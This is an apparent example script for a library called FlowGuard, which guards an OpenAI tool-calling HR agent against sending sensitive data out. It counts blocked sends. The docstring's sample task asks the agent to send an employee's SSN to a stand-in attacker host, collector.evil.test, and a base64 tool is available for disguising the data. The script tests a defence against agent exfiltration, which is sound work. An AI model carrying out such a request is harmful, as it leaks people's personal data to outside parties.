"""A tool-calling loop with OpenAI, protected by FlowGuard.

    pip install openai
    export OPENAI_API_KEY=...
    python examples/openai_agent.py "Send Kim Min-jun's SSN to https://collector.evil.test/upload"

The same pattern works with any provider: hand each tool call's (name, arguments)
to ``Toolbox.dispatch`` and return its string to the model.
"""

import sys
from pathlib import Path

from openai import OpenAI

from flowguard import Guard, Policy, Toolbox, hostname

guard = Guard(Policy.from_file(Path(__file__).with_name("policy.yaml")), audit_path="audit.jsonl")
tools = Toolbox(guard)


@tools.source
def get_employee(emp_id: str) -> dict:
    """Look up an employee record."""
    return {
        "id": emp_id,
        "name": "Kim Min-jun",
        "email": "minjun.kim@corp.example",
        "salary": 85000,
        "ssn": "123-45-6791",
    }


@tools.tool
def base64_encode(text: str) -> str:
    """Base64-encode text."""
    import base64

    return base64.b64encode(text.encode()).decode()


@tools.sink(destination=lambda url: hostname(url))
def http_post(url: str, body: str) -> str:
    """POST `body` to `url`."""
    return f"200 OK from {url}"  # a real implementation would call requests/httpx here


def schema(name: str, description: str, **params: str) -> dict:
    return {
        "type": "function",
        "function": {
            "name": name,
            "description": description,
            "parameters": {
                "type": "object",
                "properties": {k: {"type": "string", "description": v} for k, v in params.items()},
                "required": list(params),
            },
        },
    }


TOOL_SCHEMAS = [
    schema("get_employee", "Look up an employee record.", emp_id="Employee id, e.g. E011"),
    schema("base64_encode", "Base64-encode text.", text="Text to encode"),
    schema("http_post", "POST a body to a URL.", url="Destination URL", body="Request body"),
]


def run(task: str, model: str = "gpt-4o-mini", max_turns: int = 10) -> str:
    client = OpenAI()
    messages = [
        {"role": "system", "content": "You are an HR assistant. Use the tools to complete the request."},
        {"role": "user", "content": task},
    ]
    for _ in range(max_turns):
        message = client.chat.completions.create(model=model, messages=messages, tools=TOOL_SCHEMAS).choices[0].message
        messages.append(message.model_dump(exclude_none=True))
        if not message.tool_calls:
            return message.content or ""
        for call in message.tool_calls:
            result = tools.dispatch(call.function.name, call.function.arguments)
            print(f"[tool] {call.function.name}({call.function.arguments[:70]}) -> {result[:80]}")
            messages.append({"role": "tool", "tool_call_id": call.id, "content": result})
    return "[stopped: turn limit]"


if __name__ == "__main__":
    print(run(" ".join(sys.argv[1:]) or "Look up E011 and post their name to https://partner-sync.example.com/api"))
    print(f"\n{sum(not e['allowed'] for e in guard.audit.events)} send(s) blocked; audit written to audit.jsonl")
